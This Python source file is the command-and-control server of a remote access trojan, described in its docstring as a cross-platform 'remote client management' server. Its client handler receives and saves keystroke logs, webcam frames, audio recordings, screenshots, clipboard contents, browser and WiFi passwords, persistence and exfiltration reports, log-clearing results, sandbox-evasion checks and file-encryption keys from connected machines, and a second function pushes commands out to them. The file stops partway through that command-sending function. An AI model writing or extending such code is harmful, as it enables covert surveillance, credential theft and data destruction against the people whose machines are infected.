#!/usr/bin/env python3
"""
Universal Server - Cross-platform server for remote client management
Supports Windows, Linux, and macOS
"""

import json
import os
import socket
import threading
import time
import sys
import logging
import platform
import shutil
from pathlib import Path
from datetime import datetime
from collections import defaultdict

# Configuration
CONFIG_FILE = 'server_config.json'
DEFAULT_CONFIG = {
    'host': '0.0.0.0',
    'port': 12345,
    'max_clients': 100,
    'socket_timeout': 60.0,
    'log_level': 'INFO',
    'log_file': 'server.log',
    'command_history_file': 'command_history.json',
    'client_timeout': 300,  # 5 minutes
    'enable_command_history': True,
    'enable_authentication': False,
    'auth_token': None,  # Auto-generated if None
    'rate_limit_enabled': True,
    'rate_limit_requests': 100,  # Commands per minute per client (applied when sending commands)
    'rate_limit_window': 60,  # Seconds
    'connection_rate_limit_enabled': True,
    'connection_rate_limit_requests': 10,  # Connection attempts per minute per client
    'connection_rate_limit_window': 60,  # Seconds
    'enable_monitoring': True,
    'monitoring_port': 8080,
    'enable_backup': True,
    'backup_interval': 3600,  # Seconds
    'command_queue_enabled': True,
    'max_queue_size': 1000,
    'enable_metrics': True,
    'metrics_file': 'server_metrics.json'
}

# Global variables
is_running = True
clients = []
clients_info = {}  # Store client information
clients_lock = threading.Lock()
logger = None
config = {}
command_history = []
history_lock = threading.Lock()
start_time = None  # Initialize at module level
start_time_lock = threading.Lock()  # Lock for start_time synchronization

# Enhanced features
rate_limiter = defaultdict(list)  # Track commands per client (for command rate limiting)
connection_rate_limiter = defaultdict(list)  # Track connection attempts per client
rate_limit_lock = threading.Lock()
connection_rate_limit_lock = threading.Lock()
command_queue = []  # Command queue for delayed execution
queue_lock = threading.Lock()
server_metrics = {
    'total_connections': 0,
    'total_commands_sent': 0,
    'total_bytes_sent': 0,
    'total_bytes_received': 0,
    'uptime_seconds': 0,
    'peak_clients': 0,
    'error_count': 0,
    'last_backup': None,
    'health_status': 'healthy',
    'last_health_check': None,
    'active_threads': 0
}
metrics_lock = threading.Lock()
auth_tokens = {}  # Store client auth tokens
backup_thread = None
monitoring_thread = None
health_check_thread = None
connection_pool = {}  # Connection pool for reuse
pool_lock = threading.Lock()

def setup_logging(log_level='INFO', log_file='server.log'):
    """Setup logging configuration"""
    global logger
    log_format = '%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s'
    logging.basicConfig(
        level=getattr(logging, log_level.upper(), logging.INFO),
        format=log_format,
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    logger = logging.getLogger(__name__)

def load_config():
    """Load configuration from file or create default"""
    global config
    config_path = Path(CONFIG_FILE)
    
    if config_path.exists():
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
            logger.info(f"Configuration loaded from {CONFIG_FILE}")
        except Exception as e:
            logger.warning(f"Error loading config: {e}. Using defaults.")
            config = DEFAULT_CONFIG.copy()
    else:
        config = DEFAULT_CONFIG.copy()
        save_config()
        logger.info(f"Created default configuration file: {CONFIG_FILE}")

def save_config():
    """Save current configuration to file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving config: {e}")

def load_command_history():
    """Load command history from file"""
    global command_history
    history_file = config.get('command_history_file', 'command_history.json')
    if os.path.exists(history_file):
        try:
            with open(history_file, 'r') as f:
                command_history = json.load(f)
            logger.info(f"Loaded {len(command_history)} commands from history")
        except Exception as e:
            logger.warning(f"Error loading command history: {e}")
            command_history = []

def save_command_history():
    """Save command history to file"""
    if not config.get('enable_command_history', True):
        return
    history_file = config.get('command_history_file', 'command_history.json')
    try:
        with history_lock:
            with open(history_file, 'w') as f:
                json.dump(command_history[-100:], f, indent=2)  # Keep last 100 commands
    except Exception as e:
        logger.error(f"Error saving command history: {e}")

def add_to_history(command, result=None):
    """Add command to history"""
    global command_history
    if not config.get('enable_command_history', True):
        return
    with history_lock:
        command_history.append({
            'timestamp': datetime.now().isoformat(),
            'command': command,
            'result': result,
            'clients_affected': len(clients)
        })
        if len(command_history) > 1000:  # Limit history size
            command_history[:] = command_history[-1000:]

def send_message(sock, message):
    """Send message with delimiter"""
    try:
        sock.send((message + '\n').encode('utf-8'))
        return True
    except Exception as e:
        logger.error(f"Error sending message: {e}")
        return False

def receive_message(sock, timeout=None):
    """Receive message with delimiter"""
    try:
        if timeout:
            sock.settimeout(timeout)
        data = b''
        while b'\n' not in data:
            chunk = sock.recv(1024)
            if not chunk:
                return None
            data += chunk
        return data.decode('utf-8').strip()
    except socket.timeout:
        return None
    except Exception as e:
        logger.debug(f"Error receiving message: {e}")
        return None

def handle_client(client_socket, address):
    """Handle client communication"""
    global clients, clients_info
    client_id = f"{address[0]}:{address[1]}"
    logger.info(f"[{client_id}] Client handler started")
    
    # Check connection rate limit - socket was already added to clients list in server_program()
    # to atomically reserve a slot and prevent max_clients race condition
    # If connection rate limit fails, we need to remove the socket from the list
    # Note: This limits connection attempts, not commands (command rate limiting is in send_command)
    if not check_connection_rate_limit(client_id):
        logger.warning(f"[{client_id}] Connection rate limit exceeded, disconnecting")
        # Remove socket from clients list since it was added in server_program()
        with clients_lock:
            if client_socket in clients:
                clients.remove(client_socket)
        try:
            client_socket.close()
        except:
            pass
        return
    
    # Socket is already in clients list (added atomically in server_program())
    # Initialize client info if not already set (it may be set later when client sends info)
    with clients_lock:
        if client_id not in clients_info:
            clients_info[client_id] = {
                'address': address,
                'connected_at': datetime.now().isoformat(),
                'last_activity': time.time()
            }
    
    # Update metrics only after rate limit check passes
    update_metrics('total_connections')
    
    client_timeout = config.get('client_timeout', 300)
    socket_timeout = config.get('socket_timeout', 60.0)
    last_activity = time.time()
    
    while is_running:
        try:
            message = receive_message(client_socket, timeout=socket_timeout)
            
            # Check for timeout
            if message is None:
                if time.time() - last_activity > client_timeout:
                    logger.warning(f"[{client_id}] Client timeout")
                    raise ConnectionResetError("Client timeout")
                # Check if connection is still alive
                try:
                    client_socket.settimeout(1)
                    test = client_socket.recv(1, socket.MSG_PEEK)
                    if not test:
                        raise ConnectionResetError("Connection closed")
                except:
                    raise ConnectionResetError("Connection closed")
                continue
            
            last_activity = time.time()
            
            if not message:
                continue
            
            # Handle connection messages
            if message.startswith("CLIENT:"):
                if "connected" in message:
                    try:
                        # Extract client info if available
                        if ":" in message and "{" in message:
                            info_part = message.split(":", 1)[1]
                            client_info = json.loads(info_part)
                            with clients_lock:
                                clients_info[client_id] = client_info
                            logger.info(f"[{client_id}] Client connected: {client_info.get('hostname', 'Unknown')}")
                        else:
                            logger.info(f"[{client_id}] Client connected")
                    except:
                        logger.info(f"[{client_id}] Client connected")
                elif "keepalive" in message:
                    # Silent keepalive
                    pass
                elif "health" in message:
                    # Handle health check from client
                    try:
                        if ":" in message and "{" in message:
                            health_part = message.split(":", 1)[1]
                            health_data = json.loads(health_part)
                            logger.debug(f"[{client_id}] Health check: {health_data.get('status', 'unknown')}")
                            # Update client info with health data
                            with clients_lock:
                                if client_id in clients_info:
                                    clients_info[client_id]['last_health'] = health_data
                    except Exception as e:
                        logger.debug(f"Error parsing health check: {e}")
                continue
            
            # Handle configuration requests
            if message.startswith("CONFIG:"):
                try:
                    config_data = json.loads(message.split(":", 1)[1])
                    logger.info(f"[{client_id}] Received client configuration")
                except:
                    pass
                continue
            
            # Handle special response types
            if message.startswith("SCREENSHOT:"):
                screenshot_data = message.split(":", 1)[1]
                # Save screenshot
                try:
                    import base64
                    img_data = base64.b64decode(screenshot_data)
                    filename = f"screenshot_{client_id.replace(':', '_')}_{int(time.time())}.png"
                    with open(filename, 'wb') as f:
                        f.write(img_data)
                    print(f"[{client_id}] Screenshot saved: {filename}")
                except Exception as e:
                    print(f"[{client_id}] Error saving screenshot: {e}")
            elif message.startswith("PROCESSES:"):
                processes_data = message.split(":", 1)[1]
                try:
                    processes = json.loads(processes_data)
                    print(f"\n[{client_id}] Running Processes ({len(processes)}):")
                    for proc in processes[:20]:  # Show first 20
                        print(f"  PID: {proc.get('pid')}, Name: {proc.get('name')}, CPU: {proc.get('cpu_percent', 0)}%, Memory: {proc.get('memory_percent', 0)}%")
                except:
                    print(f"[{client_id}] Processes: {processes_data}")
            elif message.startswith("FILES:"):
                files_data = message.split(":", 1)[1]
                try:
                    files = json.loads(files_data)
                    print(f"\n[{client_id}] Files ({len(files)}):")
                    for f in files[:20]:  # Show first 20
                        size = f.get('size', 0)
                        size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.1f} MB"
                        print(f"  {'[DIR]' if f.get('is_dir') else '[FILE]'} {f.get('name')} ({size_str})")
                except:
                    print(f"[{client_id}] Files: {files_data}")
            elif message.startswith("FILE_DATA:"):
                file_data = message.split(":", 1)[1]
                print(f"[{client_id}] File data received (base64, length: {len(file_data)})")
            elif message.startswith("NETWORK_CONNECTIONS:"):
                conn_data = message.split(":", 1)[1]
                try:
                    connections = json.loads(conn_data)
                    print(f"\n[{client_id}] Network Connections ({len(connections)}):")
                    for conn in connections[:20]:
                        print(f"  {conn.get('laddr')} -> {conn.get('raddr')} [{conn.get('status')}]")
                except:
                    print(f"[{client_id}] Network Connections: {conn_data}")
            elif message.startswith("SOFTWARE:"):
                software_data = message.split(":", 1)[1]
                try:
                    software = json.loads(software_data)
                    print(f"\n[{client_id}] Installed Software ({len(software)}):")
                    for app in software[:20]:
                        print(f"  - {app.get('name', 'Unknown')}")
                except:
                    print(f"[{client_id}] Software: {software_data}")
            elif message.startswith("ENV_VARS:"):
                env_data = message.split(":", 1)[1]
                try:
                    env_vars = json.loads(env_data)
                    print(f"\n[{client_id}] Environment Variables ({len(env_vars)}):")
                    for key, value in list(env_vars.items())[:20]:
                        print(f"  {key} = {value[:50]}...")
                except:
                    print(f"[{client_id}] Environment Variables: {env_data}")
            elif message.startswith("SYSTEM_LOGS:"):
                logs_data = message.split(":", 1)[1]
                try:
                    logs = json.loads(logs_data)
                    print(f"\n[{client_id}] System Logs ({len(logs)}):")
                    for log in logs[:20]:
                        print(f"  {log.get('message', '')[:100]}")
                except:
                    print(f"[{client_id}] System Logs: {logs_data}")
            elif message.startswith("BROWSER_HISTORY:"):
                history_data = message.split(":", 1)[1]
                try:
                    history = json.loads(history_data)
                    print(f"\n[{client_id}] Browser History:")
                    for entry in history[:20]:
                        print(f"  {entry}")
                except:
                    print(f"[{client_id}] Browser History: {history_data}")
            elif message.startswith("CLIPBOARD:"):
                clipboard_data = message.split(":", 1)[1]
                try:
                    import base64
                    text = base64.b64decode(clipboard_data).decode('utf-8')
                    print(f"\n[{client_id}] Clipboard Contents:")
                    print(f"  {text[:200]}")
                except:
                    print(f"[{client_id}] Clipboard: {clipboard_data}")
            elif message.startswith("REAL_TIME_STATS:"):
                stats_data = message.split(":", 1)[1]
                try:
                    stats = json.loads(stats_data)
                    print(f"\n[{client_id}] Real-Time Statistics:")
                    print(f"  CPU: {stats.get('cpu_percent', 0)}%")
                    mem = stats.get('memory', {})
                    print(f"  Memory: {mem.get('percent', 0)}% ({mem.get('used', 0)/(1024**3):.2f} GB / {mem.get('total', 0)/(1024**3):.2f} GB)")
                except:
                    print(f"[{client_id}] Real-Time Stats: {stats_data}")
            elif message.startswith("NETWORK_SCAN:"):
                scan_data = message.split(":", 1)[1]
                try:
                    hosts = json.loads(scan_data)
                    print(f"\n[{client_id}] Network Scan Results ({len(hosts)} hosts found):")
                    for host in hosts[:20]:
                        print(f"  {host.get('ip')} - {host.get('status')}")
                except:
                    print(f"[{client_id}] Network Scan: {scan_data}")
            elif message.startswith("KEYLOG_DATA:"):
                keylog_data = message.split(":", 1)[1]
                try:
                    keylogs = json.loads(keylog_data)
                    print(f"\n[{client_id}] Keylog Data ({len(keylogs)} entries):")
                    for entry in keylogs[:50]:  # Show first 50
                        print(f"  {entry}")
                except:
                    print(f"[{client_id}] Keylog Data: {keylog_data}")
            elif message.startswith("WEBCAM_DATA:"):
                webcam_data = message.split(":", 1)[1]
                try:
                    webcam_info = json.loads(webcam_data)
                    frames_count = webcam_info.get('count', 0)
                    print(f"\n[{client_id}] Webcam Capture: {frames_count} frames captured")
                    # Save frames if needed
                    if frames_count > 0:
                        filename = f"webcam_{client_id.replace(':', '_')}_{int(time.time())}.json"
                        with open(filename, 'w') as f:
                            json.dump(webcam_info, f)
                        print(f"  Saved to: {filename}")
                except:
                    print(f"[{client_id}] Webcam Data received")
            elif message.startswith("AUDIO_DATA:"):
                audio_data = message.split(":", 1)[1]
                print(f"\n[{client_id}] Audio Recording: {len(audio_data)} bytes received")
                # Save audio if needed
                try:
                    import base64
                    audio_bytes = base64.b64decode(audio_data)
                    filename = f"audio_{client_id.replace(':', '_')}_{int(time.time())}.wav"
                    with open(filename, 'wb') as f:
                        f.write(audio_bytes)
                    print(f"  Saved to: {filename}")
                except:
                    pass
            elif message.startswith("REGISTRY_DATA:"):
                reg_data = message.split(":", 1)[1]
                try:
                    registry = json.loads(reg_data)
                    print(f"\n[{client_id}] Registry Data:")
                    print(json.dumps(registry, indent=2))
                except:
                    print(f"[{client_id}] Registry Data: {reg_data}")
            elif message.startswith("SERVICES:"):
                services_data = message.split(":", 1)[1]
                try:
                    services = json.loads(services_data)
                    print(f"\n[{client_id}] Services ({len(services)}):")
                    for svc in services[:20]:
                        name = svc.get('name', 'Unknown')
                        status = svc.get('status', svc.get('state', 'Unknown'))
                        print(f"  {name} - {status}")
                except:
                    print(f"[{client_id}] Services: {services_data}")
            elif message.startswith("BROWSER_PASSWORDS:"):
                passwords_data = message.split(":", 1)[1]
                try:
                    passwords = json.loads(passwords_data)
                    print(f"\n[{client_id}] Browser Passwords:")
                    for pwd in passwords:
                        print(f"  Browser: {pwd.get('browser')}, Path: {pwd.get('database_path')}")
                        print(f"  Note: {pwd.get('note', '')}")
                except:
                    print(f"[{client_id}] Browser Passwords: {passwords_data}")
            elif message.startswith("REMOTE_DESKTOP:"):
                desktop_data = message.split(":", 1)[1]
                try:
                    desktop_info = json.loads(desktop_data)
                    frames_count = desktop_info.get('count', 0)
                    print(f"\n[{client_id}] Remote Desktop: {frames_count} frames received")
                    # Save frames
                    if frames_count > 0:
                        filename = f"desktop_{client_id.replace(':', '_')}_{int(time.time())}.json"
                        with open(filename, 'w') as f:
                            json.dump(desktop_info, f)
                        print(f"  Saved to: {filename}")
                except:
                    print(f"[{client_id}] Remote Desktop data received")
            elif message.startswith("PACKETS:"):
                packets_data = message.split(":", 1)[1]
                try:
                    packets = json.loads(packets_data)
                    print(f"\n[{client_id}] Captured Packets: {len(packets) if isinstance(packets, list) else 'N/A'}")
                except:
                    print(f"[{client_id}] Packets: {packets_data}")
            elif message.startswith("SEARCH_RESULTS:"):
                search_data = message.split(":", 1)[1]
                try:
                    results = json.loads(search_data)
                    if isinstance(results, list):
                        print(f"\n[{client_id}] File Search Results ({len(results)} files):")
                        for result in results[:20]:
                            print(f"  {result.get('path')} ({result.get('size', 0)} bytes)")
                    else:
                        print(f"[{client_id}] Search Results: {search_data}")
                except:
                    print(f"[{client_id}] Search Results: {search_data}")
            elif message.startswith("GREP_RESULTS:"):
                grep_data = message.split(":", 1)[1]
                try:
                    results = json.loads(grep_data)
                    if isinstance(results, list):
                        print(f"\n[{client_id}] Grep Results ({len(results)} matches):")
                        for result in results[:20]:
                            print(f"  Line {result.get('line')}: {result.get('content')}")
                    else:
                        print(f"[{client_id}] Grep Results: {grep_data}")
                except:
                    print(f"[{client_id}] Grep Results: {grep_data}")
            elif message.startswith("LOGS_CLEARED:"):
                logs_data = message.split(":", 1)[1]
                try:
                    cleared = json.loads(logs_data)
                    print(f"\n[{client_id}] Logs Cleared:")
                    for item in cleared.get('cleared', []):
                        print(f"  - {item}")
                except:
                    print(f"[{client_id}] Logs Cleared: {logs_data}")
            elif message.startswith("STEGANOGRAPHY_DATA:"):
                steg_data = message.split(":", 1)[1]
                try:
                    import base64
                    extracted = base64.b64decode(steg_data).decode('utf-8')
                    print(f"\n[{client_id}] Extracted Steganography Data:")
                    print(f"  {extracted[:200]}")
                except:
                    print(f"[{client_id}] Steganography data received")
            elif message.startswith("VM_DETECTION:"):
                vm_data = message.split(":", 1)[1]
                try:
                    detection = json.loads(vm_data)
                    print(f"\n[{client_id}] VM/Sandbox Detection:")
                    print(f"  Is VM: {detection.get('is_vm', False)}")
                    print(f"  Is Sandbox: {detection.get('is_sandbox', False)}")
                    if detection.get('vm_indicators'):
                        print(f"  VM Indicators: {detection['vm_indicators']}")
                    if detection.get('sandbox_indicators'):
                        print(f"  Sandbox Indicators: {detection['sandbox_indicators']}")
                except:
                    print(f"[{client_id}] VM Detection: {vm_data}")
            elif message.startswith("SCHEDULED_TASKS:"):
                tasks_data = message.split(":", 1)[1]
                try:
                    tasks = json.loads(tasks_data)
                    print(f"\n[{client_id}] Scheduled Tasks ({len(tasks)}):")
                    for task in tasks:
                        print(f"  {task.get('name')} - {task.get('schedule_time')} - Enabled: {task.get('enabled')}")
                except:
                    print(f"[{client_id}] Scheduled Tasks: {tasks_data}")
            elif message.startswith("PERSISTENCE:"):
                persistence_data = message.split(":", 1)[1]
                try:
                    persistence = json.loads(persistence_data)
                    print(f"\n[{client_id}] Persistence Methods Created:")
                    for method in persistence.get('persistence_methods', []):
                        print(f"  - {method}")
                except:
                    print(f"[{client_id}] Persistence: {persistence_data}")
            elif message.startswith("EXFILTRATION:"):
                exfil_data = message.split(":", 1)[1]
                try:
                    exfil = json.loads(exfil_data)
                    print(f"\n[{client_id}] Data Exfiltration Results:")
                    for result in exfil.get('exfiltration_results', []):
                        print(f"  - {result}")
                except:
                    print(f"[{client_id}] Exfiltration: {exfil_data}")
            elif message.startswith("NETWORK_INTERFACES:"):
                interfaces_data = message.split(":", 1)[1]
                try:
                    interfaces = json.loads(interfaces_data)
                    print(f"\n[{client_id}] Network Interfaces ({len(interfaces)}):")
                    for iface in interfaces[:10]:
                        print(f"  {iface.get('name')} - Up: {iface.get('is_up')} - Speed: {iface.get('speed')} Mbps")
                        for addr in iface.get('addresses', [])[:2]:
                            print(f"    {addr.get('family')}: {addr.get('address')}")
                except:
                    print(f"[{client_id}] Network Interfaces: {interfaces_data}")
            elif message.startswith("MEMORY_DUMP:"):
                memory_data = message.split(":", 1)[1]
                try:
                    memory = json.loads(memory_data)
                    print(f"\n[{client_id}] Memory Dump:")
                    print(f"  PID: {memory.get('pid')}, RSS: {memory.get('rss')} bytes, VMS: {memory.get('vms')} bytes")
                except:
                    print(f"[{client_id}] Memory Dump: {memory_data}")
            elif message.startswith("CREDENTIALS:"):
                creds_data = message.split(":", 1)[1]
                try:
                    creds = json.loads(creds_data)
                    print(f"\n[{client_id}] Credentials Harvested:")
                    print(f"  Browser Passwords: {len(creds.get('browser_passwords', []))}")
                    print(f"  WiFi Passwords: {len(creds.get('wifi_passwords', []))}")
                    for wifi in creds.get('wifi_passwords', [])[:5]:
                        print(f"    SSID: {wifi.get('ssid')}, Password: {wifi.get('password')}")
                except:
                    print(f"[{client_id}] Credentials: {creds_data}")
            elif message.startswith("BATCH_RESULTS:"):
                batch_data = message.split(":", 1)[1]
                try:
                    results = json.loads(batch_data)
                    print(f"\n[{client_id}] Batch Execution Results ({len(results)} commands):")
                    for result in results[:10]:
                        print(f"  {result.get('command')[:50]} -> {result.get('result')[:50]}")
                except:
                    print(f"[{client_id}] Batch Results: {batch_data}")
            elif message.startswith("PLUGINS:"):
                plugins_data = message.split(":", 1)[1]
                try:
                    plugins = json.loads(plugins_data)
                    print(f"\n[{client_id}] Loaded Plugins ({len(plugins)}):")
                    for plugin in plugins:
                        print(f"  - {plugin}")
                except:
                    print(f"[{client_id}] Plugins: {plugins_data}")
            elif message.startswith("DATABASE_QUERY:"):
                query_data = message.split(":", 1)[1]
                try:
                    results = json.loads(query_data)
                    print(f"\n[{client_id}] Database Query Results ({len(results)} rows):")
                    for row in results[:10]:
                        print(f"  {row}")
                except:
                    print(f"[{client_id}] Database Query: {query_data}")
            elif message.startswith("FILE_ENCRYPT:") or message.startswith("FILE_DECRYPT:"):
                file_data = message.split(":", 1)[1]
                try:
                    file_info = json.loads(file_data)
                    if file_info.get('success'):
                        print(f"\n[{client_id}] File Operation Success:")
                        print(f"  File: {file_info.get('encrypted_file') or file_info.get('decrypted_file')}")
                        if 'key' in file_info:
                            print(f"  Key: {file_info['key'][:20]}...")
                    else:
                        print(f"[{client_id}] File Operation Error: {file_info.get('error')}")
                except:
                    print(f"[{client_id}] File Operation: {file_data}")
            elif message.startswith("HARDENING:"):
                hardening_data = message.split(":", 1)[1]
                try:
                    hardening = json.loads(hardening_data)
                    print(f"\n[{client_id}] System Hardening:")
                    print(f"  Firewall: {hardening.get('firewall', {}).get('status', 'unknown')}")
                    av_list = hardening.get('antivirus', {}).get('detected', [])
                    print(f"  Antivirus: {', '.join(av_list) if av_list else 'None detected'}")
                    users = hardening.get('users', {}).get('active_users', [])
                    print(f"  Active Users: {', '.join(users) if users else 'None'}")
                except:
                    print(f"[{client_id}] Hardening: {hardening_data}")
            elif message.startswith("ADV_PERSISTENCE:"):
                persistence_data = message.split(":", 1)[1]
                try:
                    persistence = json.loads(persistence_data)
                    print(f"\n[{client_id}] Advanced Persistence Methods:")
                    for method in persistence.get('persistence_methods', []):
                        print(f"  - {method}")
                except:
                    print(f"[{client_id}] Advanced Persistence: {persistence_data}")
            # Try to parse as JSON first (system info)
            elif message.startswith("{") and message.endswith("}"):
                try:
                    system_info = json.loads(message)
                    logger.info(f"[{client_id}] System Info received")
                    print(f"\n[{client_id}] System Information:")
                    print(json.dumps(system_info, indent=2))
                except json.JSONDecodeError:
                    logger.debug(f"[{client_id}] Message: {message}")
                    print(f"[{client_id}] Message: {message}")
            else:
                # Handle ACK messages and other responses
                logger.debug(f"[{client_id}] Response: {message}")
                print(f"[{client_id}] Response: {message}")
                
        except ConnectionResetError:
            logger.info(f"[{client_id}] Client disconnected")
            break
        except socket.error as e:
            logger.error(f"[{client_id}] Socket error: {e}")
            break
        except Exception as e:
            logger.error(f"[{client_id}] Error handling client: {e}", exc_info=True)
            break
    
    with clients_lock:
        if client_socket in clients:
            clients.remove(client_socket)
        if client_id in clients_info:
            del clients_info[client_id]
    try:
        client_socket.close()
    except:
        pass
    logger.info(f"[{client_id}] Client handler ended")

def send_command(command, client_filter=None):
    """Send command to clients (optionally filtered)"""
    disconnected = []
    invalid_client_ids = []  # Track client_ids with invalid sockets
    sent_count = 0
    target_clients = []
    
    with clients_lock:
        clients_copy = clients[:]
        clients_info_copy = clients_info.copy()
    
    # Initialize socket_to_client_id mapping for both filtered and non-filtered paths
    # This mapping is used as a fallback when getpeername() fails
    socket_to_client_id = {}
    
    # Filter clients if needed
    if client_filter:
        # Track sockets that are already matched to a client_id to avoid duplicate matches
        # Don't track sockets that fail getpeername() - they might be valid for other client_ids
        matched_sockets = set()
        
        for client_id, info in clients_info_copy.items():
            if client_filter(client_id, info):
                # Find corresponding socket by matching peer address to client_id
                socket_found = False
                for sock in clients_copy:
                    # Skip sockets we've already matched to a different client_id
                    if sock in matched_sockets:
                        continue
                    
                    try:
                        peer_addr = sock.getpeername()
                        socket_client_id = f"{peer_addr[0]}:{peer_addr[1]}"
                        if socket_client_id == client_id:
                            target_clients.append(sock)
                            matched_sockets.add(sock)  # Mark as matched to avoid duplicate matches
                            socket_to_client_id[sock] = client_id  # Build mapping for fallback lookup
                            socket_found = True
                            break
                    except (OSError, AttributeError) as e:
                        # Socket failed getpeername() for this client_id check
                        # Don't skip it for other client_ids - the failure might be transient
                        # or the socket might be valid for a different client_id
                        logger.debug(f"Socket getpeername() failed when checking client {client_id}: {e}")
                        continue
                
                # If socket not found, mark client_id for cleanup
                if not socket_found:
                    invalid_client_ids.append(client_id)
                    logger.warning(f"Client {client_id} has no valid socket - marking for cleanup")
        
        # After checking all filtered client_ids, verify which sockets are truly invalid
        # A socket is truly invalid if it's not in target_clients and consistently fails getpeername()
        # Check all sockets that weren't matched to see if they're invalid
        for sock in clients_copy:
            # Skip sockets we've already matched (they're valid)
            if sock in matched_sockets or sock in target_clients:
                continue
            
            # Check if socket is invalid by attempting getpeername()
            try:
                sock.getpeername()
                # Socket is valid but didn't match any filtered client_id - that's okay
            except (OSError, AttributeError):
                # Socket consistently fails getpeername() - it's invalid
                if sock not in disconnected:
                    disconnected.append(sock)
                    logger.debug(f"Confirmed invalid socket after filtering - added to disconnected")
    else:
        # For all clients, validate sockets first
        # Build a mapping of sockets to their client_ids before validation
        # Note: socket_to_client_id was already initialized above for both code paths
        # Track sockets that fail getpeername() during mapping
        failed_sockets_during_mapping = []
        # Track client_ids that don't have matching sockets (for potential matching with failed sockets)
        unmatched_client_ids = []
        
        for client_id in list(clients_info_copy.keys()):
            socket_matched = False
            for sock in clients_copy:
                try:
                    peer_addr = sock.getpeername()
                    socket_client_id = f"{peer_addr[0]}:{peer_addr[1]}"
                    if socket_client_id == client_id:
                        socket_to_client_id[sock] = client_id
                        socket_matched = True
                        break
                except (OSError, AttributeError):
                    # Socket failed getpeername() - track it for later cleanup
                    if sock not in failed_sockets_during_mapping:
                        failed_sockets_during_mapping.append(sock)
                    continue
            
            # If no socket matched this client_id, track it for potential matching with failed sockets
            if not socket_matched:
                unmatched_client_ids.append(client_id)
        
        # Now validate all sockets and build complete mapping
        for sock in clients_copy:
            try:
                peer_addr = sock.getpeername()
                socket_client_id = f"{peer_addr[0]}:{peer_addr[1]}"
                target_clients.append(sock)
                # Ensure socket is mapped to client_id if it exists in clients_info_copy
                # This handles cases where socket wasn't matched during initial mapping
                if sock not in socket_to_client_id and socket_client_id in clients_info_copy:
                    socket_to_client_id[sock] = socket_client_id
            except (OSError, AttributeError) as e:
                # Socket is closed or invalid - mark for cleanup
                disconnected.append(sock)
                logger.debug(f"Socket validation failed during bulk validation: {e}")
                # Find corresponding client_id using the mapping we built earlier
                if sock in socket_to_client_id:
                    client_id = socket_to_client_id[sock]
                    if client_id not in invalid_client_ids:
                        invalid_client_ids.append(client_id)
                        logger.debug(f"Identified orphaned client_id {client_id} for disconnected socket")
                elif sock in failed_sockets_during_mapping:
                    # Socket failed getpeername() during mapping - will be matched with unmatched client_ids after validation
                    # Just log for now, matching will happen after all sockets are validated
                    pass
        
        # After validation, match failed sockets with unmatched client_ids
        # Count how many failed sockets we encountered during validation
        failed_sockets_during_validation = [sock for sock in disconnected if sock in failed_sockets_during_mapping]
        
        if len(failed_sockets_during_validation) > 0 and len(unmatched_client_ids) > 0:
            # Try to match failed sockets with unmatched client_ids
            if len(failed_sockets_during_validation) == 1 and len(unmatched_client_ids) == 1:
                # Exact match - one failed socket, one unmatched client_id
                client_id = unmatched_client_ids[0]
                if client_id not in invalid_client_ids:
                    invalid_client_ids.append(client_id)
                    logger.debug(f"Matched failed socket to orphaned client_id {client_id} for cleanup")
            else:
                # Ambiguous - multiple failed sockets or multiple unmatched client_ids
                # Mark all unmatched client_ids for cleanup to be safe
                for client_id in unmatched_client_ids:
                    if client_id not in invalid_client_ids:
                        invalid_client_ids.append(client_id)
                logger.debug(f"Matched {len(failed_sockets_during_validation)} failed sockets with {len(unmatched_client_ids)} unmatched client_ids - marking all for cleanup")
        
        # Mark any remaining unmatched client_ids for cleanup
        # (in case there were unmatched client_ids but no failed sockets during validation)
        for client_id in unmatched_client_ids:
            if client_id not in invalid_client_ids:
                invalid_client_ids.append(client_id)
                logger.debug(f"Client {client_id} has no valid socket - marking for cleanup")
    
    # Build a mapping of sockets to client_ids for all target_clients before sending
    # This allows us to identify orphaned client_ids when send_message() fails
    target_socket_to_client_id = {}
    for sock in target_clients:
        try:
            peer_addr = sock.getpeername()
            socket_client_id = f"{peer_addr[0]}:{peer_addr[1]}"
            # Find matching client_id from clients_info_copy or use existing mapping
            if socket_client_id in clients_info_copy:
                target_socket_to_client_id[sock] = socket_client_id
            elif sock in socket_to_client_id:
                # Use existing mapping if available (for sockets that were mapped earlier)
                target_socket_to_client_id[sock] = socket_to_client_id[sock]
            else:
                # Socket is in target_clients but not mapped - log warning for debugging
                logger.warning(f"Socket in target_clients but not mapped to any client_id: {socket_client_id}")
        except (OSError, AttributeError):
            # Socket is already invalid - try to find client_id from earlier mapping
            # This handles cases where getpeername() fails but socket was in original list
            if sock in socket_to_client_id:
                client_id = socket_to_client_id[sock]
                if client_id not in invalid_client_ids:
                    invalid_client_ids.append(client_id)
                    logger.debug(f"Identified orphaned client_id {client_id} for socket that failed getpeername()")
            else:
                # Socket failed getpeername() and has no mapping - mark for cleanup
                logger.warning(f"Socket in target_clients failed getpeername() and has no client_id mapping - will be removed from clients list")
            continue
    
    # Send commands to valid clients with rate limiting
    for client in target_clients:
        # Get client_id for rate limiting
        client_id = None
        if client in target_socket_to_client_id:
            client_id = target_socket_to_client_id[client]
        elif client in socket_to_client_id:
            client_id = socket_to_client_id[client]
        
        # Check command rate limit per client (limits commands sent to each client)
        if client_id and not check_rate_limit(client_id):
            logger.warning(f"[{client_id}] Command rate limit exceeded, skipping command")
            continue
        
        # send_message() catches all exceptions internally and returns False on error
        # Check the return value instead of catching exceptions
        if send_message(client, command):
            sent_count += 1
        else:
            # send_message() returned False, indicating a failure
            logger.error(f"Failed to send command to client (send_message returned False)")
            disconnected.append(client)
            # Identify corresponding client_id for cleanup
            # Try both mappings: target_socket_to_client_id (built above) and socket_to_client_id (from earlier)
            client_id = None
            if client in target_socket_to_client_id:
                client_id = target_socket_to_client_id[client]
            elif client in socket_to_client_id:
                client_id = socket_to_client_id[client]
            
            if client_id and client_id not in invalid_client_ids:
                invalid_client_ids.append(client_id)
                logger.debug(f"Identified orphaned client_id {client_id} for socket that failed during send_message()")
            elif not client_id:
                # Socket failed send_message() but has no client_id mapping - log for debugging
                logger.warning(f"Socket failed send_message() but has no client_id mapping - socket will be removed from clients list")
